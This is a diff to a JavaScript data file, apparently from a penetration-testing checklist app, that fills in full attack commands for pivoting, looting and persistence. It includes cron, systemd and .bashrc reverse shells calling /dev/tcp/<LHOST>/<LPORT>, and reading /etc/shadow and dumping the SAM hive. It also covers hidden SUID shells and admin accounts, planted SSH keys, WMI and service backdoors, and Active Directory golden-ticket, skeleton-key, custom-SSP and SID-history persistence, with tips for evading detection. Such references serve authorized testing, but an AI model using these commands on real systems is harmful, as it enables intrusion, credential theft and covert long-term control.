+              "ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
+              "# On target — connect agent:",
+              "ligolo-agent -connect <LHOST>:11601 -ignore-cert"
+            ]
+          },
+          {
+            "desc": "Route internal network",
+            "subdesc": "Add route for target's internal subnet through TUN interface",
+            "cmd": [
+              "# In ligolo proxy console:",
+              ">> session → select agent session",
+              ">> ifconfig → see target's interfaces",
+              "# On attacker (new terminal):",
+              "sudo ip route add <internal_subnet>/24 dev ligolo",
+              "# In ligolo console:",
+              ">> start → activate tunnel",
+              "# Now access internal network directly: nmap <internal_ip>"
+            ]
+          },
+          {
+            "desc": "Listeners (back-traffic)",
+            "subdesc": "Create listeners on pivot host for reverse shells or file transfers",
+            "cmd": [
+              "# In ligolo session:",
+              ">> listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:1234 --tcp",
+              "# Traffic hitting pivot:1234 → forwarded to attacker:1234",
+              "# Use for reverse shells: set LHOST=<pivot_ip> LPORT=1234"
+            ]
+          },
+          {
+            "desc": "Deeper network (multi-hop)",
+            "subdesc": "Chain agents for accessing networks behind multiple pivots",
+            "cmd": [
+              "# Create second TUN interface:",
+              "sudo ip tuntap add user $(whoami) mode tun ligolo2",
+              "sudo ip link set ligolo2 up",
+              "# Add listener on first pivot for second agent:",
+              ">> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp",
+              "# Run agent on second pivot → connects through first pivot",
+              "# Add route for deeper subnet: sudo ip route add <deeper_subnet>/24 dev ligolo2"
+            ]
+          },
+          {
+            "desc": "Revert / cleanup",
+            "subdesc": "Remove routes and TUN interfaces after engagement",
+            "cmd": [
+              "sudo ip route del <internal_subnet>/24 dev ligolo",
+              "sudo ip link set ligolo down",
+              "sudo ip tuntap del mode tun ligolo"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "post-33",
+        "name": "Pivoting: Other Tools",
+        "description": "Additional pivoting tools — socat, sshuttle, plink, netsh. Choose based on OS and available tools on target.",
+        "commands": [
+          {
+            "desc": "Socat",
+            "subdesc": "Swiss army knife for port forwarding (Linux/Windows)",
+            "cmd": [
+              "# Port forward: relay traffic from one port to another",
+              "socat TCP-LISTEN:<LPORT>,fork TCP:<target_ip>:<target_port>",
+              "# Encrypted tunnel:",
+              "socat OPENSSL-LISTEN:<LPORT>,cert=cert.pem,verify=0,fork TCP:<target_ip>:<target_port>"
+            ]
+          },
+          {
+            "desc": "Sshuttle",
+            "subdesc": "Transparent VPN-like tunnel over SSH — routes entire subnet (Linux only)",
+            "cmd": [
+              "sshuttle -r user@<pivot_host> <internal_subnet>/24",
+              "# With SSH key:",
+              "sshuttle -r user@<pivot_host> <internal_subnet>/24 --ssh-cmd 'ssh -i key.pem'",
+              "# Exclude attacker subnet:",
+              "sshuttle -r user@<pivot_host> <internal_subnet>/24 -x <attacker_subnet>/24"
+            ]
+          },
+          {
+            "desc": "Plink (Windows SSH)",
+            "subdesc": "PuTTY CLI tool for SSH tunnels from Windows targets",
+            "cmd": [
+              "plink.exe -ssh -l <user> -pw <pass> -R <RPORT>:127.0.0.1:<LPORT> <attacker_ip>",
+              "# Dynamic forward:",
+              "plink.exe -ssh -l <user> -pw <pass> -D 1080 <attacker_ip>"
+            ]
+          },
+          {
+            "desc": "netsh (Windows built-in)",
+            "subdesc": "Windows native port forwarding — no tools needed",
+            "cmd": [
+              "netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 connectport=<target_port> connectaddress=<target_ip>",
+              "# Verify:",
+              "netsh interface portproxy show all",
+              "# Remove:",
+              "netsh interface portproxy delete v4tov4 listenport=<LPORT> listenaddress=0.0.0.0"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "post-34",
+        "name": "Loot: Flags & Sensitive Files",
+        "description": "Collect proof files, flags, credentials, and sensitive data for documentation and reporting.",
+        "commands": [
+          {
+            "desc": "Linux flags & secrets",
+            "subdesc": "Common flag locations and sensitive files",
+            "cmd": [
+              "find / -name 'proof.txt' -o -name 'local.txt' -o -name 'flag.txt' -o -name 'root.txt' -o -name 'user.txt' 2>/dev/null",
+              "cat /root/proof.txt 2>/dev/null",
+              "cat /home/*/local.txt 2>/dev/null",
+              "cat /etc/shadow",
+              "find / -name '*.kdbx' -o -name '*.key' -o -name '*.pfx' 2>/dev/null"
+            ]
+          },
+          {
+            "desc": "Windows flags & secrets",
+            "subdesc": "Common flag locations and sensitive files",
+            "cmd": [
+              "type C:\\Users\\Administrator\\Desktop\\proof.txt",
+              "type C:\\Users\\*\\Desktop\\local.txt",
+              "dir /s /b C:\\Users\\*\\*.txt C:\\Users\\*\\*.kdbx C:\\Users\\*\\*.key 2>nul",
+              "reg save hklm\\sam C:\\Temp\\sam.save",
+              "reg save hklm\\system C:\\Temp\\system.save"
             ]
           }
         ]
@@ -5181,13 +7172,26 @@ const checklistPhases = [
       {
         "id": "persist-1",
         "name": "Linux: SSH Key Persistence",
-        "description": "Add persistent SSH key access.",
+        "description": "Add attacker SSH key to authorized_keys for persistent passwordless access.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Generate and plant SSH key",
+            "subdesc": "Add to target user's authorized_keys",
             "cmd": [
-              "ssh-keygen -t rsa -b 4096 -f /tmp/backdoor_key"
+              "# On attacker: generate key pair",
+              "ssh-keygen -t rsa -b 4096 -f /tmp/backdoor_key -N ''",
+              "# On target: add public key",
+              "mkdir -p /root/.ssh",
+              "echo '<contents of backdoor_key.pub>' >> /root/.ssh/authorized_keys",
+              "chmod 600 /root/.ssh/authorized_keys",
+              "# Connect: ssh -i /tmp/backdoor_key root@<TARGET>"
+            ]
+          },
+          {
+            "desc": "Multiple user persistence",
+            "subdesc": "Plant keys in all user home directories",
+            "cmd": [
+              "for user in $(ls /home); do mkdir -p /home/$user/.ssh; echo '<pubkey>' >> /home/$user/.ssh/authorized_keys; done"
             ]
           }
         ]
@@ -5195,13 +7199,31 @@ const checklistPhases = [
       {
         "id": "persist-2",
         "name": "Linux: Cron Job Backdoor",
-        "description": "Recurring callback task.",
+        "description": "Create recurring reverse shell callback via cron job. Survives reboots.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "User crontab backdoor",
+            "subdesc": "Reverse shell every minute",
             "cmd": [
-              "(crontab -l; echo \"* * * * * /bin/bash -c ...\") | crontab -"
+              "(crontab -l 2>/dev/null; echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"') | crontab -"
+            ]
+          },
+          {
+            "desc": "System crontab backdoor",
+            "subdesc": "Requires root — more persistent, survives user deletion",
+            "cmd": [
+              "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"' >> /etc/crontab",
+              "# Alternatively, drop script in cron.d:",
+              "echo '* * * * * root /tmp/.backdoor.sh' > /etc/cron.d/sysupdate"
+            ]
+          },
+          {
+            "desc": "Verify persistence",
+            "subdesc": "Confirm cron jobs are active and will survive reboot",
+            "cmd": [
+              "crontab -l",
+              "cat /etc/crontab",
+              "ls -la /etc/cron.d/"
             ]
           }
         ]
@@ -5209,85 +7231,421 @@ const checklistPhases = [
       {
         "id": "persist-3",
         "name": "Linux: SUID Backdoor",
-        "description": "SUID shell persistence.",
+        "description": "Create SUID copy of bash or custom binary for instant root escalation.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "SUID bash copy",
+            "subdesc": "Quick root shell via SUID bit",
             "cmd": [
               "cp /bin/bash /tmp/.hidden_shell",
-              "chmod u+s /tmp/.hidden_shell"
+              "chmod u+s /tmp/.hidden_shell",
+              "# Trigger: /tmp/.hidden_shell -p"
+            ]
+          },
+          {
+            "desc": "Hidden SUID in legitimate directory",
+            "subdesc": "Hide in system paths to avoid detection",
+            "cmd": [
+              "cp /bin/bash /usr/local/bin/.update-helper",
+              "chmod 4755 /usr/local/bin/.update-helper",
+              "# Trigger: /usr/local/bin/.update-helper -p"
             ]
           }
         ]
       },
       {
         "id": "persist-4",
-        "name": "Linux: Systemd Service",
-        "description": "Persistent service callback.",
+        "name": "Linux: Systemd Service Backdoor",
+        "description": "Create a systemd service that starts on boot and maintains persistent callback.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Create malicious service",
+            "subdesc": "Reverse shell service that auto-starts and restarts on failure",
             "cmd": [
-              "systemctl enable backdoor.service"
+              "# Create service file:",
+              "cat > /etc/systemd/system/sysupdate.service << 'EOF'\n[Unit]\nDescription=System Update Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\nEOF",
+              "systemctl daemon-reload",
+              "systemctl enable sysupdate.service",
+              "systemctl start sysupdate.service"
             ]
           }
         ]
       },
       {
         "id": "persist-5",
-        "name": "Windows: Registry Run Key",
-        "description": "Autorun persistence.",
+        "name": "Linux: Bashrc/Profile Backdoor",
+        "description": "Inject commands into shell initialization files — executes every time user logs in or opens terminal.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": ".bashrc backdoor",
+            "subdesc": "Triggers on every new bash session",
             "cmd": [
-              "reg add \"HKCU\\...\\Run\" /v Updater /t REG_SZ /d \"C:\\Temp\\shell.exe\" /f"
+              "echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 &' >> /root/.bashrc",
+              "echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 &' >> /home/<user>/.bashrc"
+            ]
+          },
+          {
+            "desc": ".profile / .bash_profile backdoor",
+            "subdesc": "Triggers on login shells only",
+            "cmd": [
+              "echo 'nohup bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\" &' >> /root/.profile"
+            ]
+          },
+          {
+            "desc": "Add user to sudoers",
+            "subdesc": "Ensure persistent sudo access even if password changes",
+            "cmd": [
+              "echo '<username> ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
+              "# Or via sudoers.d:",
+              "echo '<username> ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/<username>"
             ]
           }
         ]
       },
       {
         "id": "persist-6",
-        "name": "Windows: Scheduled Task",
-        "description": "Scheduled persistent execution.",
+        "name": "Linux: PAM & Login Backdoor",
+        "description": "Backdoor PAM for universal password acceptance or inject into login mechanisms.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "PAM backdoor (advanced)",
+            "subdesc": "Modify PAM module to accept a hardcoded password for any user",
             "cmd": [
-              "schtasks /create /tn \"SystemUpdate\" /tr \"C:\\Temp\\shell.exe\" /sc minute /mo 5 /ru SYSTEM"
+              "# Modify pam_unix.so source to accept backdoor password",
+              "# Compile modified pam_unix.so and replace original",
+              "# Backup original: cp /lib/x86_64-linux-gnu/security/pam_unix.so /tmp/.pam_unix.so.bak"
+            ]
+          },
+          {
+            "desc": "Add root user to /etc/passwd",
+            "subdesc": "Create new user with UID 0 (root)",
+            "cmd": [
+              "openssl passwd -1 -salt xyz password123",
+              "echo 'backdoor:$1$xyz$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd"
             ]
           }
         ]
       },
       {
         "id": "persist-7",
-        "name": "Windows: New Admin User",
-        "description": "Create persistent privileged account.",
+        "name": "Windows: Registry Run Key",
+        "description": "Add registry autorun entry — payload executes every time the user logs in.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Current user (HKCU)",
+            "subdesc": "Runs when current user logs in — no admin needed",
             "cmd": [
-              "net user hacker Password123! /add",
-              "net localgroup Administrators hacker /add"
+              "reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Temp\\shell.exe\" /f",
+              "# PowerShell alternative:",
+              "Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Updater' -Value 'C:\\Temp\\shell.exe'"
+            ]
+          },
+          {
+            "desc": "All users (HKLM)",
+            "subdesc": "Requires admin — runs for any user logon",
+            "cmd": [
+              "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Temp\\shell.exe\" /f"
+            ]
+          },
+          {
+            "desc": "Other autorun locations",
+            "subdesc": "Less monitored registry keys",
+            "cmd": [
+              "reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v Updater /t REG_SZ /d \"C:\\Temp\\shell.exe\" /f",
+              "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe,C:\\Temp\\shell.exe\" /f"
             ]
           }
         ]
       },
       {
         "id": "persist-8",
-        "name": "Windows: Golden Ticket (AD)",
-        "description": "Domain-level persistence.",
+        "name": "Windows: Scheduled Task Persistence",
+        "description": "Create scheduled task for recurring payload execution. Runs as SYSTEM if admin.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "SYSTEM scheduled task",
+            "subdesc": "Runs every 5 minutes as SYSTEM — requires admin",
             "cmd": [
-              "mimikatz kerberos::golden ..."
+              "schtasks /create /tn \"SystemUpdate\" /tr \"C:\\Temp\\shell.exe\" /sc minute /mo 5 /ru SYSTEM /f",
+              "# On logon trigger:",
+              "schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\Temp\\shell.exe\" /sc onlogon /ru SYSTEM /f"
+            ]
+          },
+          {
+            "desc": "User-level scheduled task",
+            "subdesc": "No admin needed — runs as current user",
+            "cmd": [
+              "schtasks /create /tn \"Updater\" /tr \"C:\\Temp\\shell.exe\" /sc minute /mo 5 /f",
+              "# PowerShell:",
+              "$action = New-ScheduledTaskAction -Execute 'C:\\Temp\\shell.exe'",
+              "$trigger = New-ScheduledTaskTrigger -AtLogon",
+              "Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'Updater' -Description 'System Update'"
+            ]
+          },
+          {
+            "desc": "Verify",
+            "subdesc": "Confirm scheduled task is registered and running on schedule",
+            "cmd": [
+              "schtasks /query /tn \"SystemUpdate\" /fo LIST /v"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "persist-9",
+        "name": "Windows: New Admin User",
+        "description": "Create persistent privileged local account. Quick but noisy — easily detected.",
+        "commands": [
+          {
+            "desc": "Create local admin",
+            "subdesc": "Add user and grant admin + RDP",
+            "cmd": [
+              "net user hacker Password123! /add",
+              "net localgroup Administrators hacker /add",
+              "net localgroup \"Remote Desktop Users\" hacker /add"
+            ]
+          },
+          {
+            "desc": "Hide user from login screen",
+            "subdesc": "Prevent user from showing on Windows login UI",
+            "cmd": [
+              "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v hacker /t REG_DWORD /d 0 /f"
+            ]
+          },
+          {
+            "desc": "Enable RDP (if disabled)",
+            "subdesc": "Enable Remote Desktop and allow through firewall",
+            "cmd": [
+              "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+              "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "persist-10",
+        "name": "Windows: Service Creation",
+        "description": "Create a Windows service that runs payload as SYSTEM on boot.",
+        "commands": [
+          {
+            "desc": "Create persistent service",
+            "subdesc": "Auto-start service running as SYSTEM",
+            "cmd": [
+              "sc create SysUpdate binpath= \"C:\\Temp\\shell.exe\" start= auto obj= LocalSystem",
+              "sc start SysUpdate",
+              "# With description to blend in:",
+              "sc description SysUpdate \"Windows System Update Service\""
+            ]
+          },
+          {
+            "desc": "Modify existing service",
+            "subdesc": "Hijack a disabled/stopped service binary path",
+            "cmd": [
+              "sc config <stopped_service> binpath= \"C:\\Temp\\shell.exe\"",
+              "sc config <stopped_service> start= auto",
+              "sc start <stopped_service>"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "persist-11",
+        "name": "Windows: WMI Event Subscription",
+        "description": "Fileless persistence using WMI event triggers. Survives reboots, hard to detect.",
+        "commands": [
+          {
+            "desc": "WMI event subscription",
+            "subdesc": "Trigger payload on system startup via WMI permanent event",
+            "cmd": [
+              "# Create WMI event filter (triggers on boot):",
+              "$filterArgs = @{name='Updater'; EventNameSpace='root\\CimV2'; QueryLanguage='WQL'; Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}",
+              "$filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments $filterArgs",
+              "# Create consumer (action):",
+              "$consumerArgs = @{name='Updater'; CommandLineTemplate='C:\\Temp\\shell.exe'}",
+              "$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\subscription' -Arguments $consumerArgs",
+              "# Bind filter to consumer:",
+              "$bindingArgs = @{Filter=$filter; Consumer=$consumer}",
+              "Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments $bindingArgs"
+            ]
+          },
+          {
+            "desc": "Detect / cleanup WMI persistence",
+            "subdesc": "Enumerate WMI event subscriptions to verify or remove persistence",
+            "cmd": [
+              "Get-WmiObject -Namespace root\\subscription -Class __EventFilter",
+              "Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer",
+              "Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "persist-12",
+        "name": "Windows: Startup Folder",
+        "description": "Drop payload in Startup folder — executes on user logon. Simple but effective.",
+        "commands": [
+          {
+            "desc": "Current user startup",
+            "subdesc": "Only runs when specific user logs in",
+            "cmd": [
+              "copy C:\\Temp\\shell.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.exe\""
+            ]
+          },
+          {
+            "desc": "All users startup",
+            "subdesc": "Requires admin — runs for any user logon",
+            "cmd": [
+              "copy C:\\Temp\\shell.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\updater.exe\""
+            ]
+          }
+        ]
+      },
+      {
+        "id": "persist-13",
+        "name": "AD: Golden Ticket",
+        "description": "Forge TGT with krbtgt hash — complete domain access that survives password resets (except krbtgt reset).",
+        "commands": [
+          {
+            "desc": "Extract krbtgt hash",
+            "subdesc": "Need Domain Admin or DCSync rights",
+            "cmd": [
+              "# DCSync for krbtgt:",
+              "mimikatz # lsadump::dcsync /user:krbtgt",
+              "secretsdump.py <domain>/<admin>:<pass>@<dc_ip> -just-dc-user krbtgt"
+            ]
+          },
+          {
+            "desc": "Forge golden ticket",
+            "subdesc": "Create TGT valid for any user — default 10 year lifetime",
+            "cmd": [
+              "mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt",
+              "# With impacket:",
+              "ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain <domain> Administrator",
+              "export KRB5CCNAME=Administrator.ccache",
+              "psexec.py <domain>/Administrator@<dc> -k -no-pass"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "persist-14",
+        "name": "AD: Silver Ticket",
+        "description": "Forge TGS for specific service using service account hash — more targeted and stealthy than golden ticket.",
+        "commands": [
+          {
+            "desc": "Forge silver ticket",
+            "subdesc": "Target specific service (CIFS, HTTP, MSSQL, etc.)",
+            "cmd": [
+              "mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /target:<target_server> /service:cifs /rc4:<service_account_hash> /ptt",
+              "# Common service SPNs: cifs (SMB), http (web), mssql, ldap, host"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "persist-15",
+        "name": "AD: Diamond & Sapphire Tickets",
+        "description": "Modern ticket attacks that modify legitimate TGTs — harder to detect than golden tickets.",
+        "commands": [
+          {
+            "desc": "Diamond ticket (Rubeus)",
+            "subdesc": "Modify real TGT instead of forging from scratch — evades golden ticket detections",
+            "cmd": [
+              "Rubeus.exe diamond /krbkey:<aes256_krbtgt_key> /user:<user> /password:<pass> /enctype:aes /domain:<domain> /dc:<dc> /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt"
+            ]
+          },
+          {
+            "desc": "Sapphire ticket (Rubeus)",
+            "subdesc": "Uses S4U2self + U2U to get legitimate PAC — most stealthy Kerberos persistence",
+            "cmd": [
+              "Rubeus.exe diamond /krbkey:<aes256_krbtgt_key> /user:<user> /password:<pass> /enctype:aes /domain:<domain> /dc:<dc> /ticketuser:Administrator /ticketuserid:500 /groups:512 /tgtdeleg /ptt"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "persist-16",
+        "name": "AD: DSRM & Skeleton Key",
+        "description": "Domain Controller persistence mechanisms — DSRM password abuse and in-memory skeleton key.",
+        "commands": [
+          {
+            "desc": "DSRM persistence",
+            "subdesc": "Use Directory Services Restore Mode password to access DC",
+            "cmd": [
+              "# Dump DSRM password (on DC):",
+              "mimikatz # token::elevate",
+              "mimikatz # lsadump::sam",
+              "# Enable network DSRM logon:",
+              "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f",
+              "# Login with DSRM creds: use Administrator hash with /domain:dc-hostname"
+            ]
+          },
+          {
+            "desc": "Skeleton key",
+            "subdesc": "Patch LSASS in memory — allows logging in as ANY user with password 'mimikatz'. Lost on reboot.",
+            "cmd": [
+              "mimikatz # privilege::debug",
+              "mimikatz # misc::skeleton",
+              "# Now login as any user with password: mimikatz"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "persist-17",
+        "name": "AD: Golden Certificate & Custom SSP",
+        "description": "ADCS certificate persistence and custom Security Support Provider for credential harvesting.",
+        "commands": [
+          {
+            "desc": "Golden certificate",
+            "subdesc": "Steal CA private key → forge certificates for any user indefinitely",
+            "cmd": [
+              "# Extract CA certificate & key:",
+              "certipy ca -ca '<ca_name>' -backup -u <admin>@<domain> -p <pass> -dc-ip <dc_ip>",
+              "# Forge certificate for Administrator:",
+              "certipy forge -ca-pfx ca.pfx -upn Administrator@<domain> -subject 'CN=Administrator'",
+              "# Authenticate with forged cert:",
+              "certipy auth -pfx administrator_forged.pfx -dc-ip <dc_ip>"
+            ]
+          },
+          {
+            "desc": "Custom SSP",
+            "subdesc": "Register malicious SSP DLL to capture plaintext credentials at logon",
+            "cmd": [
+              "# Copy mimilib.dll to C:\\Windows\\System32",
+              "# Register SSP:",
+              "mimikatz # misc::memssp",
+              "# Credentials logged to: C:\\Windows\\System32\\kiwissp.log",
+              "# Persistent across reboots (registry):",
+              "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Security Packages\" /t REG_MULTI_SZ /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /f"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "persist-18",
+        "name": "AD: AdminSDHolder & SID History",
+        "description": "Stealthy AD persistence via protected object abuse and SID history injection.",
+        "commands": [
+          {
+            "desc": "AdminSDHolder abuse",
+            "subdesc": "Add ACE to AdminSDHolder → propagates to all protected groups every 60 min (SDProp)",
+            "cmd": [
+              "# Grant user Full Control on AdminSDHolder:",
+              "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<domain>' -PrincipalIdentity <user> -Rights All -Verbose",
+              "# After SDProp runs (~60 min), user has Full Control on Domain Admins, Enterprise Admins, etc.",
+              "# Force SDProp: Invoke-SDPropagator -ShowProgress"
+            ]
+          },
+          {
+            "desc": "SID History injection",
+            "subdesc": "Add Domain Admin SID to a regular user's SID history → effective DA without group membership",
+            "cmd": [
+              "# Requires Domain Admin or ability to modify user attributes:",
+              "mimikatz # sid::patch",
+              "mimikatz # sid::add /sam:<target_user> /new:<domain_admin_sid>",
+              "# Alternatively with PowerView:",
+              "Set-DomainObject -Identity <user> -Set @{'SIDHistory'='<DA_SID>'}"
             ]
           }
         ]
